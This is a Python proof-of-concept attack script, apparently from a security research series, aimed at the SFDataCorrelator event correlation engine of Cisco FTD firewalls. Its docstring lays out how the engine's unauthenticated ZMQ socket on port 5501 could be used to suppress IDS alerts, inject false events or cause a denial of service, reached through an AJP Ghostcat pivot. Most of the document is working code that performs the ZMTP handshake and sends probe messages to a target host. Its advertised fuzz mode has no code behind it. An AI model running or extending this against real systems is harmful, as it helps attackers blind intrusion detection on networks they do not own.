"""
F-FTD-103: SFDataCorrelator ZMQ REP socket — NULL auth (port 5501)
CONTROLLED ENVIRONMENT ONLY

Root cause:
  SFDataCorrelator (sfdc ELF binary at /usr/local/sf/bin/sfdc) is the core
  Sourcefire event correlation engine on FTD. It binds a ZMQ REP socket
  (ZMTP 3.0, NULL authentication) at TCP port 5501.

  Binary identification:
    _Z21SFDataCorrelator_mainiPPcS0_  (SFDataCorrelator_main)
    /var/sf/run/SFDataCorrelator.pid
    /etc/sf/SFDataCorrelator_Threading.conf

  Library chain:
    sfdc → libmsglyr.so.1.0.0 → libzmq.so.5
    Also: librabbitmq.so.4, librdkafka.so.1, libfpreplication.so, libclamav.so.9

  Message format (from msg_layer.jar decompilation):
    Message class: Vector<String> payload — ZMQ multi-part frames, each frame = UTF-8 string
    Channel property: REQ_REP_SERVER_ENDPOINT — sfdc is the REP server
    Java clients: CommunicationHandler via RequestReplyMsgPattern (REQ_CLIENT role)
    ConfigCommunicationManager connects to CD_SERVER_ENDPOINT → sfdc REP socket

  ZMQ patterns used by sfdc:
    REQ_REP: sfdc REP server ← Java CommunicationHandler REQ client (port 5501)
    ASYNC_DEALER: CD deployment channel (separate endpoint)
    PUB_SUB: sfdc publishes events (ipc:///tmp/cd-publish-server default)

  Attack vectors:
    1. NULL auth bypass: Any process that can reach port 5501 can send/recv
       No ZMTP CURVE or PLAIN auth — pure ZMTP 3.0 NULL mechanism
    2. Message injection: Send arbitrary multi-part String messages to sfdc
       Could corrupt event correlation, inject false threat events, or trigger
       code paths that process untrusted message content
    3. DoS: Malformed or flood messages can overwhelm the REP socket queue,
       blocking legitimate ConfigCommunicationManager deploys and event correlation
    4. Bind address exposure: If bound to 0.0.0.0:5501 (not confirmed from static
       analysis alone), port is network-accessible without auth
       From network: AJP bypass (F-FTD-98) → port forward → sfdc ZMQ queries

  Impact assessment:
    SFDataCorrelator is the event processing backbone. Corrupting it:
    - Suppresses intrusion detection alerts (blind the IDS)
    - Injects false events (alert fatigue / cover for real attacks)
    - Crashes the correlation engine → lina continues forwarding but IDS dark

  Bind address (confirmation needed from live VM):
    Run: ss -tlnp | grep 5501
    Expected: 127.0.0.1:5501 (loopback, requires local access or AJP bridge)
    Worst case: 0.0.0.0:5501 (network-accessible, no auth required)

Chain:
  F-FTD-103 (sfdc ZMQ NULL auth) — standalone if 0.0.0.0, else:
  F-FTD-98 (AJP Ghostcat) → pivot → F-FTD-103 (sfdc control plane query)
    → F-FTD-104 (event suppression / false event injection) [TODO]

Severity: CRITICAL (0.0.0.0 bind) / HIGH (127.0.0.1 bind)
  Requires: network access to port 5501 (direct or via local pivot)
  Impact: SFDataCorrelator control plane accessible without authentication
  Novel: ZMQ REP NULL auth on security correlation engine not previously documented

References:
  SFDataCorrelator: sfdc ELF, /var/sf/run/SFDataCorrelator.pid
  msg_layer.jar: com.cisco.ngfw.messagelayer.Message (Vector<String> payload)
  MsgLayer$CHANNEL_PROPERTY.REQ_REP_SERVER_ENDPOINT
  RequestReplyMsgPattern.connectEndpoint() — socket type 3=REQ, 4=REP
  ConfigCommunicationManager.CD_SERVER_ENDPOINT → sfdc REP socket
"""

# CONTROLLED ENVIRONMENT ONLY

import argparse
import socket
import struct
import time
from typing import Optional


FINDING = "F-FTD-103"
LABEL = "SFDataCorrelator ZMQ REP socket — NULL auth on port 5501"
DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 5501


# ZMTP 3.0 frame format:
#   1 byte flags (0x00=short, 0x02=long, 0x01=more)
#   1 or 8 bytes length (short=1B, long=8B per flags bit 1)
#   N bytes body

def zmtp_greeting() -> bytes:
    """Build ZMTP 3.0 NULL mechanism greeting (64 bytes)."""
    # Signature: 0xff 0x00*8 0x7f
    sig = b'\xff' + b'\x00' * 8 + b'\x7f'
    version = b'\x03\x00'  # ZMTP 3.0
    mechanism = b'NULL' + b'\x00' * 16  # 20 bytes, padded to 20
    as_server = b'\x00'
    filler = b'\x00' * 31
    greeting = sig + version + mechanism + as_server + filler
    assert len(greeting) == 64
    return greeting


def zmtp_ready_command() -> bytes:
    """Build ZMTP 3.0 READY command (REQ client → REP server)."""
    # Command: 0x04 flags, length, "READY" + metadata
    cmd_name = b'\x05READY'
    socket_type_meta = b'\x0bSocket-Type\x00\x00\x00\x03REQ'
    body = cmd_name + socket_type_meta
    flags = 0x04  # command, short
    frame = bytes([flags, len(body)]) + body
    return frame


def zmtp_send_message(parts: list) -> bytes:
    """Build multi-part ZMTP 3.0 message frames."""
    result = b''
    for i, part in enumerate(parts):
        if isinstance(part, str):
            part = part.encode('utf-8')
        more = 0x01 if i < len(parts) - 1 else 0x00  # MORE flag if not last
        flags = more  # short frame (bit 0=more, bit 1=long=0)
        result += bytes([flags, len(part)]) + part
    return result


def zmtp_handshake(conn: socket.socket, timeout: int = 5) -> bool:
    """Perform ZMTP 3.0 NULL handshake with sfdc REP server."""
    conn.settimeout(timeout)

    # Step 1: Send our greeting
    conn.sendall(zmtp_greeting())

    # Step 2: Read server greeting (64 bytes)
    try:
        greeting = b''
        while len(greeting) < 64:
            chunk = conn.recv(64 - len(greeting))
            if not chunk:
                return False
            greeting += chunk
    except socket.timeout:
        print("[-] Timeout waiting for ZMTP greeting")
        return False

    if len(greeting) < 64 or greeting[0] != 0xff:
        print(f"[-] Invalid ZMTP greeting: {greeting[:10].hex()}")
        return False

    version_major = greeting[10]
    version_minor = greeting[11]
    mechanism = greeting[12:32].rstrip(b'\x00').decode('ascii', errors='replace')
    print(f"[+] ZMTP {version_major}.{version_minor} greeting received")
    print(f"    Mechanism: {mechanism!r}")

    if mechanism != 'NULL':
        print(f"[-] Non-NULL auth mechanism: {mechanism!r} — connection blocked")
        return False

    # Step 3: Send READY command
    conn.sendall(zmtp_ready_command())

    # Step 4: Read server READY
    try:
        resp = conn.recv(256)
        if not resp:
            return False
        flags = resp[0]
        length = resp[1]
        body = resp[2:2+length]
        if b'READY' in body:
            print(f"[+] ZMTP handshake complete — NULL auth accepted")
            return True
        else:
            print(f"[.] Unexpected ZMTP response: {resp[:20].hex()}")
            return True  # May still be usable
    except socket.timeout:
        print("[.] No READY response — handshake may still have succeeded")
        return True


def send_probe_message(conn: socket.socket, parts: list, timeout: int = 5) -> Optional[list]:
    """Send a multi-part REQ message and receive REP response."""
    conn.settimeout(timeout)
    msg = zmtp_send_message(parts)
    conn.sendall(msg)

    resp_parts = []
    try:
        buf = b''
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            buf += chunk
            # Parse frames
            offset = 0
            while offset < len(buf) - 1:
                flags = buf[offset]
                if flags & 0x02:  # long frame
                    if offset + 9 > len(buf):
                        break
                    length = struct.unpack('>Q', buf[offset+1:offset+9])[0]
                    start = offset + 9
                else:
                    if offset + 2 > len(buf):
                        break
                    length = buf[offset+1]
                    start = offset + 2
                if start + length > len(buf):
                    break
                body = buf[start:start+length]
                if not (flags & 0x04):  # not a command
                    resp_parts.append(body)
                offset = start + length
                if not (flags & 0x01):  # no MORE flag — last frame
                    return resp_parts
            if resp_parts and not (buf[-2] & 0x01 if len(buf) >= 2 else True):
                break
    except socket.timeout:
        pass
    return resp_parts if resp_parts else None


PROBE_MESSAGES = [
    # Empty probe — trigger error response showing protocol format
    [''],
    # Common FTD internal message subjects
    ['STATUS'],
    ['VERSION'],
    ['PING'],
    ['GET_STATUS'],
    ['GET_VERSION'],
    # CD initialization message type (from ConfigCommunicationManager constants)
    ['CD_INITIALIZATION_STATUS_MESSAGE'],
    ['CD_INITIALIZATION_STATUS'],
    # Event query messages
    ['GET_EVENTS'],
    ['QUERY_EVENTS'],
    # Deploy messages
    ['DEPLOY_STATUS'],
    # Null byte probe
    ['\x00'],
    # Multi-part probes
    ['STATUS', 'GET'],
    ['QUERY', 'EVENTS', '100'],
]


def probe_sfdc_zmq(host: str, port: int, timeout: int = 10) -> dict:
    """Probe SFDataCorrelator ZMQ REP socket for NULL auth and response analysis."""
    result = {
        'host': host,
        'port': port,
        'reachable': False,
        'zmtp_version': None,
        'auth_mechanism': None,
        'null_auth_accepted': False,
        'responses': [],
        'error': None
    }

    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.settimeout(timeout)
        conn.connect((host, port))
        result['reachable'] = True
        print(f"[+] Connected to {host}:{port}")
    except Exception as e:
        result['error'] = str(e)
        print(f"[-] Cannot connect to {host}:{port}: {e}")
        return result

    try:
        if not zmtp_handshake(conn, timeout):
            print("[-] ZMTP handshake failed")
            conn.close()
            return result

        result['null_auth_accepted'] = True
        print(f"[!] NULL auth accepted — no authentication on sfdc ZMQ REP socket")
        print()

        # Send probe messages
        print(f"[2] Sending {len(PROBE_MESSAGES)} probe messages...")
        for parts in PROBE_MESSAGES:
            try:
                resp = send_probe_message(conn, parts, timeout=3)
                parts_str = repr(parts[0]) if len(parts) == 1 else repr(parts)
                if resp:
                    resp_decoded = [b.decode('utf-8', errors='repr') for b in resp]
                    print(f"    REQ {parts_str}: RESPONSE={resp_decoded}")
                    result['responses'].append({'req': parts, 'resp': resp_decoded})
                else:
                    print(f"    REQ {parts_str}: no response (timeout)")
                time.sleep(0.1)
            except Exception as e:
                print(f"    REQ {parts_str}: error — {e}")

    except Exception as e:
        result['error'] = str(e)
    finally:
        conn.close()

    return result


def check_bind_address(host: str, port: int) -> None:
    """Verify binding address — test localhost vs 0.0.0.0."""
    print("[0] Checking bind address...")
    for test_host in [host, '127.0.0.1']:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((test_host, port))
            s.close()
            print(f"    [+] {test_host}:{port} OPEN")
        except Exception as e:
            print(f"    [-] {test_host}:{port}: {e}")


def main() -> None:
    ap = argparse.ArgumentParser(description=f'{FINDING}: {LABEL}')
    ap.add_argument('host', nargs='?', default=DEFAULT_HOST,
                    help=f'Target host (default: {DEFAULT_HOST})')
    ap.add_argument('--port', type=int, default=DEFAULT_PORT,
                    help=f'SFDataCorrelator ZMQ REP port (default: {DEFAULT_PORT})')
    ap.add_argument('--mode', choices=['probe', 'handshake', 'fuzz'],
                    default='probe',
                    help='probe: full NULL auth + message probe; '
                         'handshake: NULL auth check only; '
                         'fuzz: extended message fuzzing')
    ap.add_argument('--timeout', type=int, default=10)
    args = ap.parse_args()

    print(f'[*] {FINDING}: {LABEL}')
    print(f'[*] Target: {args.host}:{args.port}')
    print('[!] CONTROLLED ENVIRONMENT ONLY')
    print('[!] SFDataCorrelator is the FTD IDS event correlation engine')
    print('[!] Sending messages may corrupt event data or DoS the IDS subsystem')
    print()

    check_bind_address(args.host, args.port)
    print()

    result = probe_sfdc_zmq(args.host, args.port, args.timeout)

    print()
    print(f'[*] {FINDING}: Results')
    print(f'    Reachable: {result["reachable"]}')
    print(f'    NULL auth accepted: {result["null_auth_accepted"]}')
    print(f'    Responses collected: {len(result["responses"])}')

    if result['null_auth_accepted']:
        print()
        print(f'[!] FINDING CONFIRMED: SFDataCorrelator REP socket accepts unauthenticated connections')
        print(f'    Impact: SFDataCorrelator control plane accessible without credentials')
        print(f'    Chain: F-FTD-98 (AJP pivot) → F-FTD-103 → sfdc event suppression/injection')
        print(f'    CVE candidate: ZMTP NULL auth on IDS correlation engine (novel finding)')


if __name__ == '__main__':
    main()
